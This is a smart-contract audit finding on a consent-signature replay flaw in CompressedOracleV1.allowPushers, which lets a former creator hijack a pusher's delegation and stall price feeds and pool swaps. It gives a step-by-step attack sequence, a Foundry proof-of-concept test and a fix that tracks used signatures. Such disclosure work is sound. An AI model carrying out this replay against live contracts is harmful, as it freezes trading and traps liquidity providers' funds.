### Title
`allowPushers` consent signature replay by a prior creator silently overrides a pusher's active delegation, causing oracle feeds to go stale and pool swaps to halt - (File: smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol)

---

### Summary

`CompressedOracleV1.allowPushers` accepts a pusher's EIP-191 consent signature and unconditionally overwrites `namespaceRemapping[pusher]`. Because no used-signature registry exists, a creator who previously held a pusher's consent can replay that signature within its deadline window to silently redirect the pusher's live feed writes away from a different creator the pusher has since moved to, causing the second creator's feeds to go stale and every pool anchored to those feeds to revert with `FeedStalled`.

---

### Finding Description

`allowPushers` signs over `keccak256(abi.encode(chainid, address(this), deadline, pusher, msg.sender))`. [1](#0-0) 

There is no nonce, no consumed-signature bitmap, and no check that `namespaceRemapping[pusher]` is currently zero or already points to `msg.sender`. The function simply overwrites whatever is stored: [2](#0-1) 

**Attack sequence:**

1. Pusher **P** signs consent for creator **C1** with `deadline = D1` (e.g. 30 days from now).
2. **C1** calls `allowPushers` → `namespaceRemapping[P] = C1`.
3. **P** calls `revokePusher()` → `namespaceRemapping[P] = address(0)`.
4. **P** signs fresh consent for creator **C2**; **C2** calls `allowPushers` → `namespaceRemapping[P] = C2`.
5. **C1** (malicious) calls `allowPushers` again with the *same* old signature (still within `D1`) → `namespaceRemapping[P] = C1`, silently overwriting C2's delegation.
6. **P**'s `fallback()` pushes now resolve `namespaceRemapping[msg.sender] = C1` and write into **C1**'s namespace instead of **C2**'s. [3](#0-2) 

**P** can call `revokePusher()` to clear the mapping, but **C1** can immediately replay the old signature again. This creates a sustained griefing loop until `D1` expires.

The documentation acknowledges the simpler self-revocation replay case but does not guard against a *different* creator using an old signature to override an active delegation: [4](#0-3) 

---

### Impact Explanation

**C2**'s feeds stop receiving updates. Their slot timestamps freeze. Every price provider reading those feeds via `getOracleData` → `_price` → `timestampMs.toSeconds()` returns a `refTime` that ages past `MAX_TIME_DELTA`, causing `_isStale` to return `true` and `getBidAndAskPrice` to revert with `FeedStalled`. [5](#0-4) 

Every pool whose `IPriceProvider` is backed by **C2**'s compressed feeds cannot execute swaps for the duration of the attack. LPs cannot exit positions; traders cannot close. This is broken core pool functionality causing unusable swap/liquidity flows.

---

### Likelihood Explanation

- **C1** need only be any address that previously obtained a consent signature from **P** with a non-trivial deadline — a realistic operational scenario (e.g., a pusher rotates between oracle operators).
- The attack is fully permissionless after the initial setup: **C1** calls one public function with calldata already on-chain.
- No privileged role is required; **C1** is an ordinary EOA or contract.
- The griefing window equals the remaining lifetime of `D1`; if operators use multi-day or multi-week deadlines (common practice), the DoS is sustained.

---

### Recommendation

Track consumed consent signatures to prevent replay:

```solidity
mapping(bytes32 => bool) private _usedConsents;

function allowPushers(...) external {
    ...
    bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
        keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
    );
    require(!_usedConsents[hash], "consent already used");
    require(pusher == ECDSA.recover(hash, signatures[i]));
    _usedConsents[hash] = true;
    namespaceRemapping[pusher] = msg.sender;
    ...
}
```

Alternatively, include a per-pusher nonce in the signed message so each consent can only be used once regardless of deadline.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {CompressedOracleV1} from
    "smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol";
import {MessageHashUtils} from
    "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
import {IOffchainOracle} from
    "smart-contracts-poc/contracts/interfaces/IOffchainOracle.sol";
import {U64x32} from "smart-contracts-poc/contracts/oracles/utils/U64x32.sol";

contract AllowPushersReplayTest is Test {
    CompressedOracleV1 oracle;

    uint256 constant PUSHER_KEY  = 0xBEEF;
    uint256 constant C1_KEY      = 0xC1C1;
    uint256 constant C2_KEY      = 0xC2C2;

    address pusher;
    address c1;
    address c2;

    function setUp() public {
        oracle = new CompressedOracleV1(address(this), 0);
        vm.warp(1_700_000_000);
        pusher = vm.addr(PUSHER_KEY);
        c1     = vm.addr(C1_KEY);
        c2     = vm.addr(C2_KEY);
    }

    function _signConsent(uint256 pk, uint256 deadline, address _pusher, address _creator)
        internal view returns (bytes memory)
    {
        bytes32 digest = MessageHashUtils.toEthSignedMessageHash(
            keccak256(abi.encode(block.chainid, address(oracle), deadline, _pusher, _creator))
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, digest);
        return abi.encodePacked(r, s, v);
    }

    function _allow(address caller, uint256 deadline, address _pusher, bytes memory sig) internal {
        address[] memory ps = new address[](1); ps[0] = _pusher;
        bytes[]   memory ss = new bytes[](1);   ss[0] = sig;
        vm.prank(caller);
        oracle.allowPushers(deadline, ps, ss);
    }

    function _wordAt(uint8 slotId, uint8 pos, uint32 price, uint56 tsMs)
        internal pure returns (bytes memory)
    {
        uint48 raw = (uint48(price) << 16) | (uint48(5) << 8) | uint48(5);
        uint256 word = (uint256(tsMs) << 8) | uint256(slotId);
        word |= uint256(raw) << (208 - uint256(pos) * 48);
        return abi.encodePacked(word);
    }

    function testReplayHijacksDelegation() public {
        uint256 deadline = block.timestamp + 30 days;

        // Step 1: pusher signs consent for C1
        bytes memory sigForC1 = _signConsent(PUSHER_KEY, deadline, pusher, c1);

        // Step 2: C1 establishes delegation
        _allow(c1, deadline, pusher, sigForC1);
        assertEq(oracle.namespaceRemapping(pusher), c1);

        // Step 3: pusher revokes
        vm.prank(pusher);
        oracle.revokePusher();
        assertEq(oracle.namespaceRemapping(pusher), address(0));

        // Step 4: pusher moves to C2
        bytes memory sigForC2 = _signConsent(PUSHER_KEY, deadline, pusher, c2);
        _allow(c2, deadline, pusher, sigForC2);
        assertEq(oracle.namespaceRemapping(pusher), c2);

        // Step 5: C1 replays old signature — overrides C2's delegation
        _allow(c1, deadline, pusher, sigForC1);
        assertEq(oracle.namespaceRemapping(pusher), c1, "C1 hijacked delegation");

        // Step 6: pusher's push now lands in C1's namespace, not C2's
        uint56 tsMs = uint56(block.timestamp * 1000);
        vm.prank(pusher);
        (bool ok,) = address(oracle).call(_wordAt(0, 0, 1_000_000, tsMs));
        assertTrue(ok);

        // C2's feed is empty (stale) — pools using C2's feeds will FeedStalled
        IOffchainOracle.OracleData memory c2Data =
            oracle.getOracleData(oracle.feedIdOf(c2, 0, 0));
        assertEq(c2Data.price, 0, "C2 feed is stale");

        // C1's feed received the push
        IOffchainOracle.OracleData memory c1Data =
            oracle.getOracleData(oracle.feedIdOf(c1, 0, 0));
        assertEq(c1Data.price, U64x32.decode(1_000_000), "C1 received push");
    }
}
```
